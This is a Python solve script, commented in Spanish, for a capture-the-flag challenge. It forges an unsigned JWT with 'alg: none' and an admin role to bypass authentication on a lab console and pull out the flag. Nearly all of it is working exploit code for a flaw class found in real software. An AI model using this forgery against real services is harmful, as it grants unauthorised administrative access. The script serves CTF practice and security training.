#!/usr/bin/env python3
"""CDM CTF 2026-11-13 - Consola SICH (203.0.113.10:8007)

Vulnerabilidad: el servidor acepta JWT con `alg: none`. La unica proteccion
es la firma HS256; al declarar el algoritmo "none" y dejar la firma vacia, el
token se considera valido y el campo `rol` se puede poner en "admin".

Uso: python solve.py [host:puerto]
"""
from __future__ import annotations

import base64
import binascii
import json
import re
import sys

import requests

BASE = "http://" + (sys.argv[1] if len(sys.argv) > 1 else "203.0.113.10:8007")
FLAG_RE = re.compile(r"cdm\{[^}]*\}")


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def jwt_none(payload: dict) -> str:
    """JWT con alg=none y firma vacia (tercer segmento vacio)."""
    header = {"alg": "none", "typ": "JWT"}
    return ".".join(
        (
            b64url(json.dumps(header, separators=(",", ":")).encode()),
            b64url(json.dumps(payload, separators=(",", ":")).encode()),
            "",
        )
    )


def leer_payload(token: str) -> dict:
    partes = token.split(".")
    if len(partes) < 2:
        return {}
    datos = partes[1] + "=" * (-len(partes[1]) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(datos))
    except (binascii.Error, ValueError):
        return {}


def main() -> int:
    s = requests.Session()

    # 1) Token legitimo de visitante (rol: visitante)
    s.post(f"{BASE}/", data={"usuario": "invitado"}, timeout=15)
    legitimo = s.cookies.get("sich_jwt", "")
    print(f"[*] token de visitante: {leer_payload(legitimo)}")

    # 2) Token forjado con alg=none y rol admin
    falso = jwt_none({"usuario": "admin", "rol": "admin"})
    print(f"[*] token forjado (alg=none): {falso}")

    r = requests.get(f"{BASE}/consola", cookies={"sich_jwt": falso}, timeout=15)
    m = FLAG_RE.search(r.text)
    if not m:
        print("[-] la consola no entrego la flag")
        return 1
    flag = m.group(0)
    print(f"[+] FLAG: {flag}")

    with open("flag.txt", "w", encoding="utf-8") as fh:
        fh.write(flag + "\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
